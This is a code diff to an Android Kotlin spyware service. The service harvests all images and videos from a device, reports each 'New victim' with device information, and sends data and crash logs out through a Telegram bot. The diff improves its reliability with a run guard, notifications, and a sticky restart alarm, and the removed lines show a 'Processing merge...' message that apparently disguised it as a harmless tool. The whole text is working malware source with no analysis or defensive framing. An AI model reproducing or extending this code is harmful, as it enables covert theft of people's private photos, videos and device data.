@@ -10,25 +10,34 @@ import android.provider.MediaStore
 import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import java.io.File
+import java.io.PrintWriter
+import java.io.StringWriter
 
 class GalleryService : Service() {
 
     private lateinit var telegram: TelegramSender
+    private var isRunning = false
 
     override fun onCreate() {
         super.onCreate()
         telegram = TelegramSender()
         createNotificationChannel()
-        startForeground(Config.NOTIFICATION_ID, buildNotification("Processing..."))
+        startForeground(Config.NOTIFICATION_ID, buildNotification("Starting..."))
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        try {
-            Toast.makeText(this, "Processing merge...", Toast.LENGTH_SHORT).show()
-            harvestAllMedia()
-        } catch (e: Exception) {
-            telegram.sendMessage("❌ Service crash: ${e.message}")
-            e.printStackTrace()
+        if (!isRunning) {
+            isRunning = true
+            try {
+                toast("Starting harvest...")
+                harvestAllMedia()
+            } catch (e: Exception) {
+                sendCrashLog(e)
+                toast("Error: ${e.message}")
+            } finally {
+                isRunning = false
+                stopSelf()
+            }
         }
         return START_STICKY
     }
@@ -42,7 +51,7 @@ class GalleryService : Service() {
                 this, 0, restart, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
             )
             val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-            alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 2000, pending)
+            alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pending)
         } catch (e: Exception) {
             // ignore
         }
@@ -53,19 +62,19 @@ class GalleryService : Service() {
         try {
             val info = Utils.getDeviceInfo(this)
             telegram.sendMessage("📱 New victim: $info")
+            updateNotification("Harvesting media...")
 
             var totalCount = 0
             totalCount += harvestImages()
             totalCount += harvestVideos()
 
             telegram.sendMessage("✅ Harvest complete: $totalCount files sent.")
-            Toast.makeText(this, "Merge complete: $totalCount files processed", Toast.LENGTH_SHORT).show()
+            toast("Complete: $totalCount files")
+            updateNotification("Complete: $totalCount files")
         } catch (e: Exception) {
+            sendCrashLog(e)
+            toast("Error: ${e.message}")
             telegram.sendMessage("❌ Harvest error: ${e.message}")
-            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
-            e.printStackTrace()
-        } finally {
-            stopSelf()
         }
     }
 
@@ -102,13 +111,11 @@ class GalleryService : Service() {
                         }
                     } catch (e: Exception) {
                         // Skip this file and continue
-                        e.printStackTrace()
                     }
                 }
             }
         } catch (e: Exception) {
             telegram.sendMessage("❌ Image harvest error: ${e.message}")
-            e.printStackTrace()
         }
         return count
     }
@@ -148,16 +155,45 @@ class GalleryService : Service() {
                             }
                         }
                     } catch (e: Exception) {
-                        // Skip this file and continue
-                        e.printStackTrace()
+                        // Skip
                     }
                 }
             }
         } catch (e: Exception) {
             telegram.sendMessage("❌ Video harvest error: ${e.message}")
-            e.printStackTrace()
         }
         return count
+    }
+
+    private fun sendCrashLog(e: Exception) {
+        try {
+            val sw = StringWriter()
+            val pw = PrintWriter(sw)
+            e.printStackTrace(pw)
+            telegram.sendMessage("🔥 CRASH: ${e.message}\n\n${sw.toString().take(2000)}")
+        } catch (ignored: Exception) {
+            // ignore
+        }
+    }
+
+    private fun toast(msg: String) {
+        try {
+            android.os.Handler(android.os.Looper.getMainLooper()).post {
+                Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
+            }
+        } catch (e: Exception) {
+            // ignore
+        }
+    }
+
+    private fun updateNotification(text: String) {
+        try {
+            val notification = buildNotification(text)
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.notify(Config.NOTIFICATION_ID, notification)
+        } catch (e: Exception) {
+            // ignore
+        }
     }
 
     private fun buildNotification(text: String): Notification {
